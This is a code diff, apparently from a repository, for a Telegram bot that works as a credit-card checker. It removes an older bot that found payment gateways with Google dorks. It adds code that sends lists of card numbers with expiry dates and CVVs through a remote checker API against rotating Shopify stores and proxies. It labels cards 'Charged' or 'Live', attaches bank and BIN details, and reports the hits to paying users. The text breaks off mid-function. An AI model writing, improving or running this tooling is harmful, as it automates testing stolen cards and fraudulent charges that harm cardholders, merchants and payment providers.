+        status = raw.get('Status', '')
 
-@bot.callback_query_handler(func=lambda call: True)
-def callback_query(call):
-    user_id = call.from_user.id
-    
-    if call.data.startswith("lang_"):
-        lang = call.data.split("_")[1]
-        user_language[user_id] = lang
-        
-        markup = types.InlineKeyboardMarkup(row_width=2)
-        btn1 = types.InlineKeyboardButton("🔍 استخراج بوابات الدفع" if lang == 'ar' else "🔍 Payment Gateways Extraction", callback_data="search")
-        btn2 = types.InlineKeyboardButton("🛡 فحص بوابات الدفع" if lang == 'ar' else "🛡 Payment Gateways Checker", callback_data="gateways")
-        markup.add(btn1, btn2)
-        
-        bot.edit_message_text(
-            get_text(lang, 'welcome'),
-            call.message.chat.id,
-            call.message.message_id,
-            reply_markup=markup
-        )
-    elif call.data == "search":
-        lang = user_language.get(user_id, 'ar')
-        bot.edit_message_text(
-            get_text(lang, 'search_section'),
-            call.message.chat.id,
-            call.message.message_id,
-            parse_mode='Markdown'
-        )
-    elif call.data == "gateways":
-        lang = user_language.get(user_id, 'ar')
-        bot.edit_message_text(
-            get_text(lang, 'gateway_section'),
-            call.message.chat.id,
-            call.message.message_id,
-            parse_mode='Markdown'
-        )
-    bot.answer_callback_query(call.id)
+        if is_dead_site_error(response_msg):
+            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gate, 'price': price}
 
-@bot.message_handler(commands=['help'])
-def send_help(message):
-    user_id = message.from_user.id
-    lang = user_language.get(user_id, 'ar')
-    bot.reply_to(message, get_text(lang, 'help'))
+        response_lower = response_msg.lower()
 
-@bot.message_handler(commands=['check'])
-def handle_check(message):
+        if status == 'Charged' or 'order completed' in response_lower or '💎' in response_msg:
+            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
+        elif 'cloudflare bypass failed' in response_lower:
+            return {'status': 'Site Error', 'message': 'Cloudflare spotted', 'card': card, 'retry': True, 'gateway': gate, 'price': price}
+        elif 'thank you' in response_lower or 'payment successful' in response_lower:
+            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
+        elif status == 'Approved' or any(key in response_lower for key in [
+            'approved', 'success',
+            'insufficient_funds', 'insufficient funds',
+            'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc',
+            'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc',
+            'incorrect_zip', 'incorrect zip'
+        ]):
+            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
+        else:
+            return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
+
+    except asyncio.TimeoutError:
+        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
+    except Exception as e:
+        error_msg = str(e)
+        if is_dead_site_error(error_msg):
+            return {'status': 'Site Error', 'message': error_msg, 'card': card, 'retry': True}
+        return {'status': 'Dead', 'message': error_msg, 'card': card, 'gateway': 'Unknown', 'price': '-'}
+
+async def check_card_with_retry(card, sites, proxies, max_retries=2):
+    """Check a card with automatic retry"""
+    last_result = None
+    if not sites:
+        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-'}
+    if not proxies:
+         return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-'}
+
+    for attempt in range(max_retries):
+        site = random.choice(sites)
+        proxy = random.choice(proxies)
+        result = await check_card(card, site, proxy)
+
+        if not result.get('retry'):
+            return result
+
+        last_result = result
+        if attempt < max_retries - 1:
+            await asyncio.sleep(0.3)  # Reduced from 0.5
+
+    if last_result:
+        return {'status': 'Dead', 'message': f'Site errors: {last_result["message"]}', 'card': card, 'gateway': last_result.get('gateway', 'Unknown'), 'price': last_result.get('price', '-'), 'site': 'Multiple'}
+
+    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-'}
+
+async def send_realtime_hit(user_id, result, hit_type, username):
+    """Send real-time notification with new design"""
+    emoji = "✅" if hit_type == "Charged" else "🔥"
+    status_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝" if hit_type == "Charged" else "𝐋𝐢𝐯𝐞"
+
+    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
+    current_date = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+
+    message = f"""<b>⚡💳 ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  💳⚡</b>
+<b>━━━━━━━━━━━━━━━━━</b>
+<b>⚡💠 𝐇𝐢𝐭 𝐅𝐨𝐮𝐧𝐝!</b>
+<blockquote>{emoji} Status: {status_text}</blockquote>
+<blockquote>💳 Card: <code>{result['card']}</code></blockquote>
+<blockquote>📝 Response: {result['message'][:150]}</blockquote>
+<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>
+<b>━━━━━━━━━━━━━━━━━</b>
+<b>🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</b>
+<pre>𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
+𝗕𝗮𝗻𝗸: {bank}
+𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}</pre>
+<b>━━━━━━━━━━━━━━━━━</b>
+
+🤖 <b>Bot By: <a href="tg://user?id=5248903529">ㅤㅤＫａｍａｌ</a></b>"""
+
     try:
-        url = message.text.split()[1].strip()
-    except IndexError:
-        bot.reply_to(message, "⚠ Wrong format!\nUse `/check example.com/path`", parse_mode='Markdown')
-        return
+        await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
+    except:
+        pass
 
-    msg = bot.reply_to(message, "⏳ Checking...")
-    result = check_site(url, message.from_user)
-    bot.edit_message_text(result, message.chat.id, msg.message_id, parse_mode='Markdown')
 
-@bot.message_handler(commands=['combo'])
-def handle_combo(message):
-    lines = message.text.split('\n')[1:]
-    urls = [line.strip() for line in lines if line.strip()]
-    if not urls:
-        bot.reply_to(message, "⚠ Please provide URLs, one per line.\nExample:\n/combo\nexample1.com/donate\nexample2.org/support")
-        return
 
-    progress = bot.reply_to(message, f"🔍 Starting combo ({len(urls)} sites)...")
+async def update_progress(user_id, message_id, results, current_attempt_count):
+    """Update progress message with new design"""
+    elapsed = int(time.time() - results['start_time'])
+    hours = elapsed // 3600
+    minutes = (elapsed % 3600) // 60
+    seconds = elapsed % 60
 
-    for i, url in enumerate(urls, 1):
-        bot.edit_message_text(
-            f"🔍 Checking {i}/{len(urls)}: {url}",
-            message.chat.id,
-            progress.message_id
-        )
+    gateway = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Unknown')
 
-        result = check_site(url, message.from_user)
-        bot.send_message(message.chat.id, result, parse_mode='Markdown')
-        time.sleep(1)
+    progress_text = f"""<b>⚡💳 ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  💳⚡</b>
+<b>━━━━━━━━━━━━━━━━━</b>
+<b>⚡💠 𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬</b>
+<blockquote>💳 Total: {results['total']} | ✅ Charged: {len(results['charged'])} | 🔥 Live: {len(results['approved'])} | ❌ Dead: {len(results['dead'])}</blockquote>
+<blockquote>📊 Checked: {current_attempt_count}/{results['total']}</blockquote>
+<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gateway}</blockquote>
+<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
+<b>━━━━━━━━━━━━━━━━━</b>"""
 
-    bot.edit_message_text(
-        f"✅ Combo completed! Checked {len(urls)} sites.",
-        message.chat.id,
-        progress.message_id
+    buttons = [
+        [Button.inline("⏸️ Pause", b"pause"), Button.inline("▶️ Resume", b"resume")],
+        [Button.inline("🛑 Stop", b"stop")]
+    ]
+
+    try:
+        await bot.edit_message(user_id, message_id, premium_emoji(progress_text), buttons=buttons, parse_mode='html')
+    except:
+        pass
+
+async def send_final_results(user_id, results):
+    """Send final results with txt file and new design"""
+    elapsed = int(time.time() - results['start_time'])
+    hours = elapsed // 3600
+    minutes = (elapsed % 3600) // 60
+    seconds = elapsed % 60
+
+    # Build hits text
+    hits_text = ""
+    if results['charged']:
+        for r in results['charged'][:5]:
+            hits_text += f"✅ <code>{r['card']}</code>\n"
+    if results['approved']:
+        for r in results['approved'][:5]:
+            hits_text += f"🔥 <code>{r['card']}</code>\n"
+
+    if not hits_text:
+        hits_text = "No hits found"
+
+    gateway = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Unknown')
+
+    current_date = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+
+    summary = f"""<b>⚡💳 ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  💳⚡</b>
+<b>━━━━━━━━━━━━━━━━━</b>
+<b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>
+<blockquote>💳 Total: {results['total']} | ✅ Charged: {len(results['charged'])} | 🔥 Live: {len(results['approved'])} | ❌ Dead: {len(results['dead'])}</blockquote>
+<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gateway}</blockquote>
+<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
+<b>━━━━━━━━━━━━━━━━━</b>
+<b>🎯💠 𝐇𝐢𝐭𝐬</b>
+<blockquote>{hits_text}</blockquote>
+<b>━━━━━━━━━━━━━━━━━</b>
+
+🤖 <b>Bot By: <a href="tg://user?id=5248903529">ㅤㅤＫａｍａｌ</a></b>"""
+
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    filename = f"shopiii_{user_id}_{timestamp}.txt"
+
+    async with aiofiles.open(filename, 'w') as f:
+        await f.write("=" * 70 + "\n")
+        await f.write("⚡💳 CC CHECKER RESULTS 💳⚡\n")
+        await f.write("Format: CC | Gateway | Price | Message | Site\n")
+        await f.write("=" * 70 + "\n\n")
+
+        await f.write(f"✅ CHARGED ({len(results['charged'])}):\n")
+        await f.write("-" * 70 + "\n")
+        for r in results['charged']:
+            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")
+        await f.write("\n")
+
+        await f.write(f"🔥 APPROVED ({len(results['approved'])}):\n")
+        await f.write("-" * 70 + "\n")
+        for r in results['approved']:
+            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")
+        await f.write("\n")
+
+        await f.write(f"❌ DEAD ({len(results['dead'])}):\n")
+        await f.write("-" * 70 + "\n")
+        for r in results['dead']:
+            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")
+
+    await bot.send_message(user_id, premium_emoji(summary), file=filename, parse_mode='html')
+
+    try:
+        os.remove(filename)
+    except:
+        pass
+
+async def test_site(site, proxy):
+    """Test a single site using the direct checker API with a test card"""
+    test_card = "5154623245618097|03|2032|156"
+    try:
+        params = {'cc': test_card, 'url': site, 'proxy': proxy}
+        timeout = aiohttp.ClientTimeout(total=60)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            async with session.get(CHECKER_API_URL, params=params) as resp:
+                raw = await resp.json(content_type=None)
+        response_msg = raw.get('Response', '').lower()
+        if is_dead_site_error(response_msg):
+            return {'site': site, 'status': 'dead'}
+        return {'site': site, 'status': 'alive'}
+    except:
+        return {'site': site, 'status': 'dead'}
+
+async def test_proxy(proxy):
+    """Test a single proxy using the direct checker API with a test card and site"""
+    test_card = "5154623245618097|03|2032|156"
+    test_site_url = "https://riverbendhomedev.myshopify.com"
+    try:
+        params = {'cc': test_card, 'url': test_site_url, 'proxy': proxy}
+        timeout = aiohttp.ClientTimeout(total=60)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            async with session.get(CHECKER_API_URL, params=params) as resp:
+                raw = await resp.json(content_type=None)
+        response_msg = raw.get('Response', '').lower()
+        if 'proxy dead' in response_msg or 'invalid proxy format' in response_msg or 'no proxy' in response_msg:
+            return {'proxy': proxy, 'status': 'dead'}
+        else:
+            return {'proxy': proxy, 'status': 'alive'}
+    except:
+        return {'proxy': proxy, 'status': 'dead'}
+@bot.on(events.NewMessage(pattern='/start'))
+async def start(event):
+    await event.reply(
+        premium_emoji(
+            "<b>⚡💳 Welcome to Shopiiiii ! 💳⚡</b>\n"
+            "<b>━━━━━━━━━━━━━━━━━</b>\n"
+            "<b>⚡💠 𝐂𝐂 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>\n"
+            "<blockquote>• /cc card|mm|yy|cvv - Check single CC\n"
+            "• /chk - Reply to .txt file to check cards</blockquote>\n"
+            "<b>⚡💠 𝐒𝐢𝐭𝐞 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>\n"
+            "<blockquote>• /site - Check all sites & remove dead\n"
+            "• /rm url - Remove a specific site</blockquote>\n"
+            "<b>⚡💠 𝐏𝐫𝐨𝐱𝐲 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>\n"
+            "<blockquote>• /proxy - Check all proxies & remove dead\n"
+            "• /addproxy - Add proxies (one per line)\n"
+            "• /chkproxy proxy - Check single proxy\n"
+            "• /rmproxy proxy - Remove single proxy\n"
+            "• /rmproxyindex 1,2,3 - Remove by index\n"
+            "• /clearproxy - Remove all proxies\n"
+            "• /getproxy - Get all proxies</blockquote>\n"
+            "<b>━━━━━━━━━━━━━━━━━</b>\n"
+            "<b>⚠️ Only premium users can use this bot.</b>"
+        ),
+        parse_mode='html'
     )
 
-@bot.message_handler(commands=['addkey'])
-def add_key(message):
-    user_id = message.from_user.id
-    parts = message.text.split()
-    if len(parts) < 2:
-        bot.reply_to(message, "يرجى إرسال المفتاح: /addkey <المفتاح>")
+@bot.on(events.NewMessage(pattern=r'^/cc\s+'))
+async def single_cc_check(event):
+    """Check a single CC"""
+    user_id = event.sender_id
+
+    try:
+        sender = await event.get_sender()
+        username = sender.username if sender.username else f"user_{user_id}"
+        first_name = sender.first_name if sender.first_name else "User"
+    except:
+        username = f"user_{user_id}"
+        first_name = "User"
+
+    if not is_premium(user_id):
+        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this bot."), parse_mode='html')
         return
-    api_key = parts[1].strip()
-    bot.reply_to(message, "جارٍ اختبار المفتاح...")
-    is_valid, msg = test_api_key(api_key)
-    if is_valid:
-        user_api_keys[user_id] = api_key
-        bot.reply_to(message, "تم حفظ المفتاح بنجاح!")
-    else:
-        bot.reply_to(message, f"خطأ: {msg}")
 
-@bot.message_handler(commands=['testkey'])
-def test_key(message):
-    user_id = message.from_user.id
-    api_key = user_api_keys.get(user_id)
-    if not api_key:
-        bot.reply_to(message, "لا يوجد مفتاح مضاف. استخدم /addkey")
+    sites = load_sites()
+    proxies = load_proxies()
+
+    if not sites:
+        await event.reply(premium_emoji("❌ No sites available. Please contact admin."), parse_mode='html')
         return
-    bot.reply_to(message, "جارٍ اختبار المفتاح...")
-    is_valid, msg = test_api_key(api_key)
-    if is_valid:
-        bot.reply_to(message, f"المفتاح صالح: {msg}")
-    else:
-        bot.reply_to(message, f"المفتاح غير صالح: {msg}")
-
-@bot.message_handler(commands=['removekey'])
-def remove_key(message):
-    user_id = message.from_user.id
-    if user_id in user_api_keys:
-        del user_api_keys[user_id]
-        if user_id in user_search_results:
-            del user_search_results[user_id]
-        bot.reply_to(message, "تم حذف المفتاح بنجاح!")
-    else:
-        bot.reply_to(message, "لا يوجد مفتاح للحذف.")
-
-@bot.message_handler(commands=['mykey'])
-def show_key(message):
-    user_id = message.from_user.id
-    api_key = user_api_keys.get(user_id)
-    if api_key:
-        masked = api_key[:8] + "..." + api_key[-6:]
-        bot.reply_to(message, f"المفتاح الحالي: {masked}")
-    else:
-        bot.reply_to(message, "لا يوجد مفتاح مضاف.")
-
-@bot.message_handler(commands=['status'])
-def show_status(message):
-    user_id = message.from_user.id
-    api_key = user_api_keys.get(user_id)
-    api_status = "غير مضاف"
-    if api_key:
-        is_valid, _ = test_api_key(api_key)
-        api_status = "صالح" if is_valid else "غير صالح"
-    status_text = f"""
-حالة البوت:
-
-المستخدم: {message.from_user.first_name}
-حالة المفتاح: {api_status}
-الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-عدد المستخدمين النشطين: {len(user_api_keys)}
-    """
-    bot.reply_to(message, status_text)
-
-@bot.message_handler(commands=['dork'])
-def handle_dork(message):
-    user_id = message.from_user.id
-    api_key = user_api_keys.get(user_id)
-    if not api_key:
-        bot.reply_to(message, "لا يوجد مفتاح API. أضف مفتاحك أولاً باستخدام /addkey")
+    if not proxies:
+        await event.reply(premium_emoji("❌ No proxies available. Please add proxies."), parse_mode='html')
         return
-    parts = message.text.split()
-    if len(parts) < 2:
-        bot.reply_to(message, "يرجى إرسال استعلام البحث: /dork <استعلام>")
+
+    cc_input = event.message.text.split(' ', 1)[1].strip()
+    cards = extract_cc(cc_input)
+
+    if not cards:
+        await event.reply(premium_emoji("❌ Invalid CC format. Use: <code>/cc card|mm|yy|cvv</code>"), parse_mode='html')
         return
-    query = " ".join(parts[1:])
-    bot.reply_to(message, f"جاري البحث عن: {query}")
-    results_text, urls = search_with_dork(query, api_key)
-    user_search_results[user_id] = {
-        'urls': urls,
-        'query': query,
-        'timestamp': datetime.now()
+
+    card = cards[0]
+    current_date = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
+
+    status_msg = await event.reply(
+        premium_emoji(
+            f"<b>⚡💳 ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  💳⚡</b>\n"
+            f"<b>━━━━━━━━━━━━━━━━━</b>\n"
+            f"<b>⚡💠 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠...</b>\n"
+            f"<blockquote>💳 Card: <code>{card}</code></blockquote>\n"
+            f"<b>━━━━━━━━━━━━━━━━━</b>"
+        ),
+        parse_mode='html'
+    )
+
+    try:
+        result = await check_card_with_retry(card, sites, proxies, max_retries=3)
+
+        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
+
+        if result['status'] == 'Charged':
+            status_emoji = "✅"
+            status_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝"
+        elif result['status'] == 'Approved':
+            status_emoji = "🔥"
+            status_text = "𝐋𝐢𝐯𝐞"
+        else:
+            status_emoji = "❌"
+            status_text = "𝐃𝐞𝐚𝐝"
+
+        final_resp = f"""<b>⚡💳 ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  💳⚡</b>
+<b>━━━━━━━━━━━━━━━━━</b>
+<b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>
+<blockquote>{status_emoji} Status: {status_text}</blockquote>
+<blockquote>💳 Card: <code>{result['card']}</code></blockquote>
+<blockquote>📝 Response: {result['message'][:150]}</blockquote>
+<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>
+<b>━━━━━━━━━━━━━━━━━</b>
+<b>🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</b>
+<pre>𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
+𝗕𝗮𝗻𝗸: {bank}
+𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}</pre>
+<b>━━━━━━━━━━━━━━━━━</b>
+
+🤖 <b>Bot By: <a href="tg://user?id=5248903529">ㅤㅤＫａｍａｌ</a></b>"""
+
+        await status_msg.edit(premium_emoji(final_resp), parse_mode='html')
+
+    except Exception as e:
+        await status_msg.edit(premium_emoji(f"❌ Error checking card: {e}"), parse_mode='html')
+
+@bot.on(events.NewMessage(pattern=r'^/chkproxy\s+'))
+async def check_single_proxy(event):
+    """Check a single proxy"""
+    user_id = event.sender_id
+
+    if not is_premium(user_id):
+        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this command."), parse_mode='html')
+        return
+
+    proxy = event.message.text.split(' ', 1)[1].strip()
+    if not proxy:
+        await event.reply(premium_emoji("❌ Usage: <code>/chkproxy ip:port:user:pass</code>"), parse_mode='html')
+        return
+
+    status_msg = await event.reply(premium_emoji(f"🔄 Checking proxy: <code>{proxy}</code>..."), parse_mode='html')
+
+    try:
+        result = await test_proxy(proxy)
+
+        if result['status'] == 'alive':
+            await status_msg.edit(premium_emoji(f"✅ <b>Proxy is ALIVE!</b>\n\n<code>{proxy}</code>"), parse_mode='html')
+        else:
+            await status_msg.edit(premium_emoji(f"❌ <b>Proxy is DEAD!</b>\n\n<code>{proxy}</code>"), parse_mode='html')
+
+    except Exception as e:
+        await status_msg.edit(premium_emoji(f"❌ Error checking proxy: {e}"), parse_mode='html')
+
+@bot.on(events.NewMessage(pattern=r'^/rmproxy\s+'))
+async def remove_single_proxy(event):
+    """Remove a single proxy from proxy.txt"""
+    user_id = event.sender_id
+
+    if not is_premium(user_id):
+        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this command."), parse_mode='html')
+        return
+
+    proxy_to_remove = event.message.text.split(' ', 1)[1].strip()
+    if not proxy_to_remove:
+        await event.reply(premium_emoji("❌ Usage: <code>/rmproxy ip:port:user:pass</code>"), parse_mode='html')
+        return
+
+    current_proxies = load_proxies()
+
+    if proxy_to_remove not in current_proxies:
+        await event.reply(premium_emoji(f"❌ Proxy not found: <code>{proxy_to_remove}</code>"), parse_mode='html')
+        return
+
+    new_proxies = [p for p in current_proxies if p != proxy_to_remove]
+
+    async with aiofiles.open(PROXY_FILE, 'w') as f:
+        for proxy in new_proxies:
+            await f.write(f"{proxy}\n")
+
+    await event.reply(premium_emoji(f"✅ <b>Proxy Removed!</b>\n\n<code>{proxy_to_remove}</code>"), parse_mode='html')
+
+@bot.on(events.NewMessage(pattern=r'^/rmproxyindex\s+'))
+async def remove_proxy_by_index(event):
+    """Remove proxies by index (comma separated)"""
+    user_id = event.sender_id
+
+    if not is_premium(user_id):
+        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this command."), parse_mode='html')
+        return
+
+    indices_str = event.message.text.split(' ', 1)[1].strip()
+    if not indices_str:
+        await event.reply(premium_emoji("❌ Usage: <code>/rmproxyindex 1,2,3</code>"), parse_mode='html')
+        return
+
+    try:
+        indices = [int(i.strip()) - 1 for i in indices_str.split(',')]
+    except ValueError:
+        await event.reply(premium_emoji("❌ Invalid indices. Use numbers separated by commas."), parse_mode='html')
+        return
+
+    current_proxies = load_proxies()
+
+    if not current_proxies:
+        await event.reply(premium_emoji("❌ No proxies in proxy.txt"), parse_mode='html')
+        return
+
+    removed = []
+    new_proxies = []
+    for i, proxy in enumerate(current_proxies):
+        if i in indices:
+            removed.append(proxy)
+        else:
+            new_proxies.append(proxy)
+
+    if not removed:
+        await event.reply(premium_emoji("❌ No valid indices found."), parse_mode='html')
+        return
+
+    async with aiofiles.open(PROXY_FILE, 'w') as f:
+        for proxy in new_proxies:
+            await f.write(f"{proxy}\n")
+
+    await event.reply(premium_emoji(f"✅ <b>Removed {len(removed)} proxies!</b>\n\nRemoved:\n<code>" + "\n".join(removed[:10]) + ("..." if len(removed) > 10 else "") + "</code>"), parse_mode='html')
+
+@bot.on(events.NewMessage(pattern=r'^/clearproxy$'))
+async def clear_all_proxies(event):
+    """Remove all proxies from proxy.txt"""
+    user_id = event.sender_id
+
+    if not is_premium(user_id):
+        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this command."), parse_mode='html')
+        return
+
+    current_proxies = load_proxies()
+    count = len(current_proxies)
+
+    if count == 0:
+        await event.reply(premium_emoji("❌ <code>proxy.txt</code> is already empty."), parse_mode='html')
+        return
+
+    # Send backup file to user
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    backup_filename = f"proxy_backup_{user_id}_{timestamp}.txt"
+
+    try:
+        async with aiofiles.open(backup_filename, 'w') as f:
+            for proxy in current_proxies:
+                await f.write(f"{proxy}\n")
+
+        await event.reply(
+            premium_emoji(
+                f"📦 <b>Backup Created!</b>\n\n"
+                f"Sending backup of {count} proxies before clearing..."
+            ),
+            file=backup_filename,
+            parse_mode='html'
+        )
+
+        # Remove backup file after sending
+        try:
+            os.remove(backup_filename)
+        except:
+            pass
+
+    except Exception as e:
+        await event.reply(premium_emoji(f"❌ Error creating backup: {e}"), parse_mode='html')
+        return
+
+    # Clear proxy.txt
+    async with aiofiles.open(PROXY_FILE, 'w') as f:
+        await f.write("")
+
+    await event.reply(premium_emoji(f"✅ <b>Cleared all {count} proxies!</b>\n\n<code>proxy.txt</code> is now empty."), parse_mode='html')
+
+@bot.on(events.NewMessage(pattern=r'^/getproxy$'))
+async def get_all_proxies(event):
+    """Get all proxies from proxy.txt"""
+    user_id = event.sender_id
+
+    if not is_premium(user_id):
+        await event.reply(premium_emoji("❌ <b>Access Denied</b>\n\nOnly premium users can use this command."), parse_mode='html')
+        return
+
+    current_proxies = load_proxies()
+
+    if not current_proxies:
+        await event.reply(premium_emoji("❌ No proxies in <code>proxy.txt</code>"), parse_mode='html')
+        return
+
+    if len(current_proxies) <= 50:
+        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(current_proxies)])
+        await event.reply(premium_emoji(f"<b>📋 All Proxies ({len(current_proxies)}):</b>\n\n{proxy_list}"), parse_mode='html')
+    else:
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"proxies_{user_id}_{timestamp}.txt"
+
+        async with aiofiles.open(filename, 'w') as f:
+            for i, proxy in enumerate(current_proxies):
+                await f.write(f"{i+1}. {proxy}\n")
+
+        await event.reply(premium_emoji(f"<b>📋 All Proxies ({len(current_proxies)}):</b>\n\nFile attached below."), file=filename, parse_mode='html')
+
+        try:
+            os.remove(filename)
+        except:
+            pass
+
+@bot.on(events.NewMessage(pattern=r'^/addproxy'))
+async def add_proxy_command(event):
+    """Command to add proxies to proxy.txt"""
+    user_id = event.sender_id
+    if not is_premium(user_id):
+        await event.reply(premium_emoji("❌ **Access Denied**\n\nOnly premium users can use this command."))
+        return
+
+    try:
+        args = event.message.text.split('\n')
+        if len(args) < 2:
+            await event.reply(premium_emoji("❌ Usage: `/addproxy` followed by proxies, one per line."))
+            return
+
+        proxies_to_add = [line.strip() for line in args[1:] if line.strip()]
+        if not proxies_to_add:
+            await event.reply(premium_emoji("❌ No proxies provided."))
+            return
+
+        current_proxies = load_proxies()
+        new_proxies = []
+
+        for proxy in proxies_to_add:
+            if proxy not in current_proxies:
+                new_proxies.append(proxy)
+
+        if not new_proxies:
+            await event.reply(premium_emoji("⚠️ All provided proxies already exist in `proxy.txt`."))
+            return
+
+        async with aiofiles.open(PROXY_FILE, 'a') as f:
+            for proxy in new_proxies:
+                await f.write(f"{proxy}\n")
+
+        await event.reply(premium_emoji(f"✅ **Proxies Added Successfully!**\n\nAdded {len(new_proxies)} new proxies to `proxy.txt`."))
+
+    except Exception as e:
+        await event.reply(premium_emoji(f"❌ Error adding proxies: {e}"))
+
+@bot.on(events.NewMessage(pattern=r'^/rm'))
+async def remove_site_command(event):
+    """Command to remove a site from sites.txt"""
+    user_id = event.sender_id
+    if not is_premium(user_id):
+        await event.reply(premium_emoji("❌ **Access Denied**\n\nOnly premium users can use this command."))
+        return
+
+    try:
+        args = event.message.text.split(' ', 1)
+        if len(args) < 2:
+            await event.reply(premium_emoji("❌ Usage: `/rm https://site.com`"))
+            return
+
+        url_to_remove = args[1].strip()
+        current_sites = load_sites()
+
+        if url_to_remove not in current_sites:
+            await event.reply(premium_emoji(f"❌ Site not found in list: `{url_to_remove}`"))
+            return
+
+        new_sites = [site for site in current_sites if site != url_to_remove]
+
+        async with aiofiles.open(SITES_FILE, 'w') as f:
+            for site in new_sites:
+                await f.write(f"{site}\n")
+
+        await event.reply(premium_emoji(f"✅ **Site Removed Successfully!**\n\n`{url_to_remove}` has been deleted from `sites.txt`.\n\n_Active checks will stop using this site in the next batch._"))
+
+    except Exception as e:
+        await event.reply(premium_emoji(f"❌ Error removing site: {e}"))
+
+@bot.on(events.NewMessage(pattern='/chk'))
+async def check_command(event):
+    """Main check command"""
+    user_id = event.sender_id
+
+    try:
+        sender = await event.get_sender()
+        username = sender.username if sender.username else f"user_{user_id}"
+    except:
+        username = f"user_{user_id}"
+
+    if not is_premium(user_id):
+        await event.reply(premium_emoji("😡 **Access Denied**\n\nOnly premium users can use this bot."))
+        return
+
+    if not event.reply_to_msg_id:
+        await event.reply(premium_emoji("😡 Please reply to a .txt file containing cards......"))
+        return
+
+    reply_msg = await event.get_reply_message()
+    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
+        await event.reply(premium_emoji("😡 Please reply to a .txt file."))
+        return
+
+    if not load_sites():
+        await event.reply(premium_emoji("❌ No sites available. Please contact admin."))
+        return
+    if not load_proxies():
+        await event.reply(premium_emoji("❌ No proxies available. Please add proxies to proxy.txt."))
+        return
+
+    status_msg = await event.reply(premium_emoji("🫆 Processing your file..."))
+
+    file_path = await reply_msg.download_media()
+
+    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+        content = await f.read()
+
+    cards = extract_cc(content)
+
+    if not cards:
+        await status_msg.edit(premium_emoji("😡 No valid cards found in file."))
+        os.remove(file_path)
+        return
+
+    if len(cards) > 5000:
